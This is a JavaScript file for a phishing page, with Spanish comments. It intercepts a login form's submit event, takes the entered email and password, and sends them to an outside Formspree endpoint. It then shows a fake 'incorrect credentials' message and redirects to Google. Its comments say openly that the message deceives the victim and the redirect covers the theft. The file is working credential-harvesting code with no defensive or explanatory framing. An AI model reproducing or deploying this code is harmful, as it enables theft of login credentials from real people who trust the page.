document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Evita que la página se recargue inmediatamente

    var email = document.getElementById('email').value;
    var pass = document.getElementById('pass').value;
    var msgDiv = document.getElementById('msg');

    // Tu ID específico de Formspree
    const formUrl = "https://formspree.io/f/xeaabodk"; 

    fetch(formUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email, password: pass })
    })
    .then(response => {
        if (response.ok) {
            // Éxito: Mostramos un mensaje falso para engañar a la víctima
            msgDiv.style.display = 'block';
            msgDiv.innerText = "Credenciales incorrectas. Inténtalo de nuevo.";
            
            // Redirigimos a Google después de 2 segundos para disimular
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);
        } else {
            alert("Error al enviar los datos.");
        }
    })
    .catch(error => {
        console.error('Error:', error);
        msgDiv.style.display = 'block';
        msgDiv.innerText = "Error de conexión. Verifica tu internet.";
    });
});
